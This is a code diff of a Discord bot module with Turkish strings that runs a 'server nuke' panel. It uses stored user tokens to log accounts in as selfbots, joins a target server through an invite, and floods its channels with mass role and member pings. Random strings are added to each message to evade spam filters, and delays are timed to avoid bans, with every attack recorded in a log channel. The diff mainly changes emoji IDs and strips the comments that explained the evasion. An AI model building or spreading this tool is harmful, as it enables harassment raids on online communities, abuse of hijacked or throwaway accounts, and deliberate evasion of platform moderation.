@@ -1,4 +1,4 @@
-const { SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder } = require('discord.js');
+const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, StringSelectMenuBuilder } = require('discord.js');
 const mongoose = require('mongoose');
 const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
 
@@ -16,14 +16,14 @@ async function renderPatlatPanel(userId, guildId) {
     });
 
     const embed = new EmbedBuilder()
-        .setTitle('<a:emoji58:1537925046486433802> Void | Sunucu Patlatma Paneli <a:emoji24:1537925080447717447>')
+        .setTitle('<:emoji133:1539424360543293521> Void | Sunucu Patlatma Paneli <:emoji141:1539424556412829817>')
         .setColor('#2b2d31')
         .setDescription(
-            '<a:emoji109:1537925984882266212> **Stealth Nuke Algoritması (Anti-Ban Korumalı)**\n' +
+            '<:emoji105:1539424496346206298> **Stealth Nuke Algoritması (Anti-Ban Korumalı)**\n' +
             'Hesaplarınız hedef sunucuya sızar. Spam filtrelerine takılmamak için mesajları şifreleyerek ve yavaşlatarak gönderir.\n\n' +
-            `<a:emoji110:1537925433763299418> Kayıtlı Hesap Sayısı: **${userAccounts.length}**\n` +
-            `<a:emoji110:1537925433763299418> Aktif Operasyondaki Hesaplar: **${aktifSayisi}**\n\n` +
-            '<a:emoji24:1537925080447717447> *Aşağıdaki butonları kullanarak paneli yönetin.*'
+            `<:emoji144:1539424259552579604> Kayıtlı Hesap Sayısı: **${userAccounts.length}**\n` +
+            `<:emoji144:1539424259552579604> Aktif Operasyondaki Hesaplar: **${aktifSayisi}**\n\n` +
+            '<:emoji141:1539424556412829817> *Aşağıdaki butonları kullanarak paneli yönetin.*'
         );
 
     // Dışarı yönlendiren sorunsuz Link butonu
@@ -57,10 +57,10 @@ module.exports = {
 
     async executeText(message) {
         const infoEmbed = new EmbedBuilder()
-            .setTitle('<a:emoji58:1537925046486433802> Void | Sunucu İmha Sistemi <a:emoji24:1537925080447717447>')
-            .setDescription('<a:emoji109:1537925984882266212> **Uyarı:** Bu sistem sunucuları felç eder. Ana hesaplarınızı KULLANMAYIN.\n\n<a:emoji24:1537925080447717447> *Paneli açmak için tıklayın.*')
+            .setTitle('<:emoji133:1539424360543293521> Void | Sunucu İmha Sistemi <:emoji141:1539424556412829817>')
+            .setDescription('<:emoji105:1539424496346206298> **Uyarı:** Bu sistem sunucuları felç eder. Ana hesaplarınızı KULLANMAYIN.\n\n<:emoji141:1539424556412829817> *Paneli açmak için tıklayın.*')
             .setColor('#2b2d31');
-        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('btn_patlat_panel').setLabel('Paneli Aç').setStyle(ButtonStyle.Secondary));
+        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('btn_patlat_panel').setLabel('Paneli Aç').setStyle(ButtonStyle.Secondary).setEmoji('1539424556412829817'));
         await message.channel.send({ embeds: [infoEmbed], components: [row] });
     },
 
@@ -74,31 +74,31 @@ module.exports = {
 
         if (id === 'tk_patlat_hepsi') {
             const userAccounts = await Account.find({ userId: i.user.id });
-            if (userAccounts.length === 0) return i.reply({ content: '<a:emoji197:1537925769068806214> Kayıtlı tokeniniz yok!', flags: 64 });
+            if (userAccounts.length === 0) return i.reply({ content: '<:emoji235:1539424382332444732> Kayıtlı tokeniniz yok!', flags: 64 });
             
             tempNukeSession.set(i.user.id, { tokens: userAccounts.map(a => a.token) });
-            return i.reply({ content: '<a:emoji110:1537925433763299418> Tüm hesaplar seçildi. İşlemi başlatmak için **Başlat** butonuna tıklayın.', flags: 64 });
+            return i.reply({ content: '<:emoji144:1539424259552579604> Tüm hesaplar seçildi. İşlemi başlatmak için **Başlat** butonuna tıklayın.', flags: 64 });
         }
 
         if (id === 'tk_patlat_sec') {
             const userAccounts = await Account.find({ userId: i.user.id });
-            if (userAccounts.length === 0) return i.reply({ content: '<a:emoji197:1537925769068806214> Kayıtlı tokeniniz yok!', flags: 64 });
+            if (userAccounts.length === 0) return i.reply({ content: '<:emoji235:1539424382332444732> Kayıtlı tokeniniz yok!', flags: 64 });
 
             const options = userAccounts.map((acc, index) => ({ label: acc.username || `Hesap ${index + 1}`, value: acc.token }));
             const selectMenu = new ActionRowBuilder().addComponents(new StringSelectMenuBuilder().setCustomId('select_patlat_token').setPlaceholder('Kullanılacak hesabı seçin').addOptions(options));
-            return i.reply({ content: '<a:emoji109:1537925984882266212> Lütfen saldırıyı yapacak hesabı seçin:', components: [selectMenu], flags: 64 });
+            return i.reply({ content: '<:emoji105:1539424496346206298> Lütfen saldırıyı yapacak hesabı seçin:', components: [selectMenu], flags: 64 });
         }
 
         if (id === 'select_patlat_token') {
             tempNukeSession.set(i.user.id, { tokens: [i.values[0]] }); 
             await i.deferUpdate().catch(()=>{});
-            return i.followUp({ content: '<a:emoji110:1537925433763299418> Hesap seçildi. İşlemi başlatmak için **Başlat** butonuna tıklayın.', flags: 64 });
+            return i.followUp({ content: '<:emoji144:1539424259552579604> Hesap seçildi. İşlemi başlatmak için **Başlat** butonuna tıklayın.', flags: 64 });
         }
 
         if (id === 'tk_patlat_baslat') {
             const sessionData = tempNukeSession.get(i.user.id);
             if (!sessionData || sessionData.tokens.length === 0) {
-                return i.reply({ content: '<a:emoji197:1537925769068806214> Önce **Hesap Seç** veya **Tüm Hesapları Seç** butonunu kullanarak işlem yapılacak hesapları belirleyin.', flags: 64 });
+                return i.reply({ content: '<:emoji235:1539424382332444732> Önce **Hesap Seç** veya **Tüm Hesapları Seç** butonunu kullanarak işlem yapılacak hesapları belirleyin.', flags: 64 });
             }
 
             const modal = new ModalBuilder().setCustomId('modal_patlat_baslat').setTitle('Hedef Sunucu Ayarları');
@@ -152,12 +152,12 @@ module.exports = {
                         const logChannel = i.client.channels.cache.get(LOG_CHANNEL_ID);
                         if (logChannel) {
                             const logEmbed = new EmbedBuilder()
-                                .setTitle('<a:emoji58:1537925046486433802> Void | Sunucu İmha Başladı!')
+                                .setTitle('<:emoji133:1539424360543293521> Void | Sunucu İmha Başladı!')
                                 .setColor('#2b2d31')
                                 .setDescription(
-                                    `<a:emoji109:1537925984882266212> **Saldırıyı Başlatan:** \`${i.user.tag}\`\n` +
-                                    `<a:emoji110:1537925433763299418> **Hedef Sunucu:** \`${guild.name}\` (\`${guild.id}\`)\n` +
-                                    `<a:emoji24:1537925080447717447> **Kullanılan Hesap:** \`${selfBot.user.tag}\`\n\n` +
+                                    `<:emoji105:1539424496346206298> **Saldırıyı Başlatan:** \`${i.user.tag}\`\n` +
+                                    `<:emoji144:1539424259552579604> **Hedef Sunucu:** \`${guild.name}\` (\`${guild.id}\`)\n` +
+                                    `<:emoji141:1539424556412829817> **Kullanılan Hesap:** \`${selfBot.user.tag}\`\n\n` +
                                     `*Stealth algoritması çalışıyor, hesap sunucuya başarıyla sızdı.*`
                                 )
                                 .setThumbnail(guild.iconURL({ dynamic: true }) || i.user.displayAvatarURL({ dynamic: true }))
@@ -192,7 +192,7 @@ module.exports = {
                                     baseText = roleMentions.substring(0, 500) + "\n**VOID SİZİ BULDU!**";
                                 } else {
                                     let userMentions = "";
-                                    for(let k = 0; k < 8; k++) { // 18'den 8'e düşürüldü, discord banlamasın diye
+                                    for(let k = 0; k < 8; k++) { 
                                         if(members.length > 0) userMentions += `<@${members[Math.floor(Math.random()*members.length)].id}> `;
                                     }
                                     baseText = userMentions + "\n**VOID İÇİNİZDEN GEÇİYOR!**";
@@ -200,13 +200,11 @@ module.exports = {
                             }
 
                             const blast = () => {
-                                // Mesajın hem başına hem sonuna rastgele kod ekle ki filtreye takılmasın
                                 const hashStart = generateRandomString(4);
                                 const hashEnd = generateRandomString(6);
                                 channel.send(`\`${hashStart}\` | ${baseText} | \`${hashEnd}\``).catch(()=>{});
                             };
 
-                            // ANTI-BAN GECİKMESİ: Minimum 2.5 saniye bekle
                             const delay = slowmode > 0 ? (slowmode * 1000) + 500 : 2500; 
                             
                             blast();
@@ -224,9 +222,9 @@ module.exports = {
             
             await i.editReply(await renderPatlatPanel(i.user.id, i.guild.id));
             if (baslatilan > 0) {
-                await i.followUp({ content: `<a:emoji110:1537925433763299418> İşlem **${baslatilan}** hesapla başlatıldı. Log kanalını takip edin.`, flags: 64 });
+                await i.followUp({ content: '<:emoji144:1539424259552579604> İşlem **' + baslatilan + '** hesapla başlatıldı. Log kanalını takip edin.', flags: 64 });
             } else {
-                await i.followUp({ content: `<a:emoji197:1537925769068806214> Hesaplar sunucuya bağlanamadı. Davet linkini kontrol edin.`, flags: 64 });
+                await i.followUp({ content: '<:emoji235:1539424382332444732> Hesaplar sunucuya bağlanamadı. Davet linkini kontrol edin.', flags: 64 });
             }
         }
 
@@ -247,9 +245,9 @@ module.exports = {
 
             await i.editReply(await renderPatlatPanel(i.user.id, i.guild.id));
             if (durdurulan > 0) {
-                await i.followUp({ content: `<a:emoji110:1537925433763299418> **${durdurulan}** hesabın işlemi başarıyla durduruldu.`, flags: 64 });
+                await i.followUp({ content: '<:emoji144:1539424259552579604> **' + durdurulan + '** hesabın işlemi başarıyla durduruldu.', flags: 64 });
             } else {
-                await i.followUp({ content: `<a:emoji197:1537925769068806214> Şu an aktif bir işlem bulunmuyor.`, flags: 64 });
+                await i.followUp({ content: '<:emoji235:1539424382332444732> Şu an aktif bir işlem bulunmuyor.', flags: 64 });
             }
         }
     }
